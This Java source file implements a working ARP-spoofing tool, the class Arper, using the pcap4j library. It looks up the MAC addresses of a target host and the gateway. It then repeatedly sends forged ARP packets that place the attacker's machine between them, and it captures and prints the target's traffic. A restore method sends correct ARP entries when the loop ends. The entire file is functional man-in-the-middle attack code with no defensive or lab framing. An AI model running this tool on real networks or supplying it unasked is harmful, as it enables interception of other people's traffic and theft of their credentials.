package com.pkt.sniff;

import org.pcap4j.util.MacAddress;

import com.pkt.sniff.packets.ARP;
import com.pkt.sniff.packets.EthernetFrame;
import com.pkt.sniff.utils.NetworkUtils;
import com.pkt.sniff.utils.Utils;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapPacket;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.ArpPacket.Builder;
import org.pcap4j.packet.namednumber.EtherType;

public class Arper {
    private String attackerIP;
    private String gatewayIP;
    private String targetIP;
    private MacAddress attackerMac;
    private MacAddress gatewayMac;
    private MacAddress targetMac;

    public Arper() {
    }

    public Arper(String attackerIP, MacAddress attackerMac) {
        this.attackerIP = attackerIP;
        this.attackerMac = attackerMac;
    }

    public Arper(String attackerIP, MacAddress attackerMac, MacAddress targetMac, MacAddress gatewayMac) {
        this(attackerIP, attackerMac);

        this.targetMac = targetMac;
        this.gatewayMac = gatewayMac;
    }

    public Arper(String attackerIP, MacAddress attackerMac, String targetIP, String gatewayIP) {
        this(attackerIP, attackerMac);
        this.targetIP = targetIP;
        this.gatewayIP = gatewayIP;

        this.targetMac = getMac(targetIP);
        this.gatewayMac = getMac(gatewayIP);
    }

    public void run() {
        PcapNetworkInterface nif = NetworkUtils.selectNetWorkInterface();
        Sniff sniff = new Sniff(nif);
        sniff.setFilter("dst host " + targetIP);

        summary();

        Utils.sleep(2000);
        System.out.println("Running...");

        while (true) {
            try {
                poison(gatewayIP, targetIP);

                Packet p = sniff.capturePacket();
                System.out.println(p);
            } catch (Exception e) {
                e.printStackTrace();
                break;
            }

        }

        sniff.closeHandle();
        System.out.println("Restoring...\n");
        restore(gatewayIP, targetIP);

    }

    private void summary() {
        System.out.println("Summary: ");
        System.out.printf("src HAddr: %s", this.attackerMac);
        System.out.println();
        System.out.printf("src IP: %s", this.attackerIP);
        System.out.println();
        System.out.printf("gateway HAddr: %s", this.gatewayMac);
        System.out.println();
        System.out.printf("gateway IP: %s", this.gatewayIP);
        System.out.println();
        System.out.printf("target HAddr: %s", this.targetMac);
        System.out.println();
        System.out.printf("target IP: %s", this.targetIP);
        System.out.println();
    }

    private void poison(String gatewayIP, String targetIP) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);

            EthernetPacket victim = buildArpPacket(gatewayIP, attackerMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, attackerMac, gatewayIP, gatewayMac);

            handle.sendPacket(gateway);
            handle.sendPacket(victim);
            handle.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void restore(String gatewayIP, String targetIP) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);

            EthernetPacket victim = buildArpPacket(gatewayIP, gatewayMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, targetMac, gatewayIP, gatewayMac);

            handle.sendPacket(gateway);
            handle.sendPacket(victim);
            handle.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private MacAddress getMac(String targetIP) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);
            handle.setFilter("arp and src host " + targetIP,
                    BpfCompileMode.OPTIMIZE);

            EthernetPacket arpPckt = buildArpPacket(
                    attackerIP,
                    attackerMac,
                    targetIP,
                    MacAddress.ETHER_BROADCAST_ADDRESS);

            handle.sendPacket(arpPckt);
            Utils.sleep(1000);

            PcapPacket frame = handle.getNextPacketEx();
            handle.close();

            MacAddress srcHardwareAddr = frame
                    .getPacket()
                    .get(EthernetPacket.class)
                    .getHeader()
                    .getSrcAddr();

            return srcHardwareAddr;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

    }

    private EthernetPacket buildArpPacket(String srcIP, MacAddress srcMac, String dstIP, MacAddress dstMac) {
        ARP arp = new ARP(srcIP, dstIP, srcMac, dstMac);
        Builder linkLayerPayload = arp.getPacket();

        EthernetFrame frame = new EthernetFrame(srcMac, dstMac, linkLayerPayload, EtherType.ARP);
        EthernetPacket packet = frame.getFrame().build();

        return packet;
    }

}
